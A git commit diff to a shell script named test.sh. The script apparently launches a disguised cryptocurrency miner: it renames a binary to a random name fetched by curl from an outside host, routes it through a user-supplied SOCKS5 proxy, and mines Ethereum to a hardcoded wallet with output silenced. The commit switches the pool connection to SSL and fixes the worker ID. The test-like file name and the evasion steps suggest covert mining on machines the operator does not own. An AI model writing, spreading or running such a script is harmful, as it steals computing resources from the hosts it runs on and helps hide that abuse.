da0ce71d4987b0828eee0bbd95a8c4954b352bc6
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-26 04:33:12 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -6,8 +6,8 @@ ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
 chmod +x bubui && mv bubui $ACAK
 read -p 'Input Proxy nya: ' PROXY
 WALLET=0xbc48b8bdce572defe4dcab85103f140099bc5af5
-POOL=stratum+tcp://eth-us-west.flexpool.io:5555
-WORKER1=$(echo $(shuf -i 1000-9999 -n TEST))
+POOL=stratum+ssl://eth-us-west.flexpool.io:5555
+WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
 #WORKER2=$(date '+%d%b')
 #WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
 ./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
